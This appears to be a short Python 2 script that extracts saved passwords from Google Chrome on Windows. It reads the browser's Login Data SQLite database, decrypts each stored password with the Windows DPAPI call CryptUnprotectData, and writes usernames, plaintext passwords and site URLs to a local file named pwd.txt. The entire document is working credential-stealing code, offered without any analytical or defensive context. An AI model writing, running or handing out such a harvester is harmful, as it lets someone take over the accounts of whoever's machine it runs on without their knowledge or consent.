# -*- coding: utf-8 -*-

import os
import win32crypt
import sqlite3

SaveFileName = r"pwd.txt"

def Extract():
    chrome_path = r"Google\Chrome\User Data\Default\Login Data"
    file_path = os.path.join(os.environ['LOCALAPPDATA'], chrome_path)
    if not os.path.exists(file_path):
        return

    conn = sqlite3.connect(file_path)
    cursor = conn.cursor()
    cursor.execute("select username_value, password_value, signon_realm from logins")

    with open(SaveFileName, 'wb') as o:
        for data in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(data[1], None, None, None, 0)
            o.write("UserName：" + data[0].encode("utf8"))
            o.write("\nPassword：" + password[1])
            o.write("\nURL：" + data[2].encode("utf8"))
            o.write("\n*****************\n")

if __name__ == "__main__":
    Extract()